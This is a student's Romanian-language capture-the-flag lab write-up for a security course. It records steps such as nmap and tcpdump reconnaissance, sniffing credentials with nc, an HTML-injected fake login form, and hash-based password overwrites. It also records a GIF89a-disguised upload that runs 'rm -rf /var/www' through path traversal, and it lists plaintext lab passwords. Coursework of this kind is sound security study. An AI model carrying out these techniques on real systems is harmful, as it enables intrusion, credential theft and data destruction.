---- TSSC Tema 2 ----

ip a s -> pt aflare ip
nmap -sN 172.20.111.4/24 -> nmap pe plaja respectiva pt a vedea alte ip-uri up
-> 172.20.111.89
conectare pe port 80 -> ./webtunnel.sh 172.20.111.89 80

---- Flag 1 ----

M-am logat ca student#4410

Am dat inspect la pagina si dand cu mouse-ul peste am vazut o portiune deasupra div-ului
de postari asa ca am cautat pana am gasit ca era deasupra lui un flag

De asemenea putea fi vazut ca e ceva acolo si daca dadeam CTRL+A

flag: SpeishFlag{DgOWjFYbfezLRDrV8MO9Y2wbBkVrxOrl}

---- Flag 2 -----

Am ascultat reteaua cu tcpdump -i eth0

Am observat un pachet interesant : 172.20.111.89.54838 > your-jail.8328

Am dat nc -l 8328 si am observat username-ul si parola guardului username=guard&password=8a8be3927a

Dupa multe click-uri si plimbari pe pagini de chaturi de profile si poze downloadate (prea multe bro)

Am gasit poza bd_duo.jpg care ascunde flagul -> strings bd_duo.jpg | grep "SpeishFlag"

flag: SpeishFlag{tvcztrwOyH7lDTvXDE4v6f3mqAOU4cAV}

---- Flag 3 ----

Din hinturi mi-am dat seama ca e ceva SQL sau HTML injection dar nu eram sigur

nikto -h http://localhost:8080/ -> mi-a confirmat ca: MyWebServer 1.0.2 is vulnerable to HTML injection

M-am dus la dekhan si am pus ca mesaj formul de login de la aplicatie pentru a-l pacali ca e acelasi si
sa isi introduca datele

<form id="loginForm" action="/auth/login" method="post" wtx-context="8166C08B-22C9-4838-98D2-4A3DA0AE5C66">
	<div class="form-group">
	  <label for="loginUsername">Username:</label>
	  <input name="username" type="text" class="form-control" id="loginUsername" wtx-context="46AB9A19-1BC6-4B67-B3F4-24C5769FD714">
	  <small class="form-text text-muted">Usually, 'student#' + your number.</small>
	</div>
	<div class="form-group">
	  <label for="loginPassword">Password</label>
	  <input name="password" type="password" class="form-control" id="loginPassword" wtx-context="3484CC43-9E30-4283-B5A4-603C9ECEBDA9">
	  <!-- default password: student -->
	</div>
	<div class="form-group form-check">
	  <input name="agreement" type="checkbox" class="form-check-input" value="1" id="agreement" wtx-context="7D42FF4E-29B5-4D5C-8AF9-90D78EA68190">
	  <label class="form-check-label" for="agreement">I acknowledge my sentence.</label>
	</div>
	<button type="submit" class="btn btn-primary">Go inside</button>
</form>

Am intrat la inspect, la networks si am asteptat sa vad daca vine ceva pe retea in clar.

Nu am observat nimic special inafara de un fisier numit login si m-am gandit sa il urmaresc.

Cand am dat eu login am putut sa observ credentialele mele in clar la payload asa ca am zis ca asta e ce trebuie

Am introdus credentialele student student pe formul facut in mesaje si am dat un logout si un login pe guard.

Spre surprinderea mea am gasit credentialele in fisierul login: dekhan / b0c6134217

Logat ca dekhan, am observat in consola si flagul

flag: SpeishFlag{Vagc6K8Ryr7wDvMXoqiSFHelUZ86sJd3}

---- Flag 4 ----

Asta a fost simplut, am observat botul la adminul de baza de date si am dat comenzi in chat
help
show tables
select, accounts

Am vazut ca parolele sunt criptate cumva si metoda de a pune string gol sau in clar, nu a mers

Si am introdus mereu doua comenzi
update, accounts, password=83592796bc17705662dc9a750c8b6d0a4fd93396, id=1 (parola)
update, accounts, password=83592796bc17705662dc9a750c8b6d0a4fd93396, username=rekt0r

Am luat toti algoritmii de criptare din lab la rand: DES, AES, RSA, 3DES dar s-au exclus rapid

Si am luat apoi functiile de hash: MD5, SHA1

A mers in cele din urma cu SHA1 si am schimbat parola: http://www.sha1-online.com/

Astfel m-am logat ca rekt0r si in consola am gasit parola pentru future uses: ee3d126dad si flagul

flag: SpeishFlag{mn5pjFNkAz6ifUYJ90ESH6YOdEGgPymF}

---- Flag 5 ----

Am dat help plz pentru a lua toate hinturile de la hacker

Am gasit interfata de scripturi Admin ("ascunsa")

Mi-am dat seama ca trb rulat un script de autodistrugere cat timp "gates are open" rm -rf /var/www

Am incercat sa il adaug in pagina web folosind formularul pentru adaugarea unei noi postari,
insa am primit mesajul ca formatul fisierului nu este acceptat.

Astfel, am adaugat antetul "GIF89a;" in script, iar la incarcare fisierul a fost acceptat.

Am dat inspect pe pagina si am observat ca deasupra butonului Fix,em este un input, dar hidden.

Am modificat sa nu mai fie hidden, am apasat pe "gates are open" si am dat ../../../bin/sh userupload/posts/script.sh

Daca dai o comanda gresita iti afiseaza calea de unde se executa si e var/www/bin

Cu ../../../ ma duc în root si cu bin ls vad folderele 

Si am văzut ca e userupload/posts/script.sh

CONGRATULATIONS! With the staff devastated for their loss, you managed to escape.
Here's your last flag:
=> flag: SpeishFlag{S2R5qATP7DTFWeyxDf3m6lKXXzlmC27L}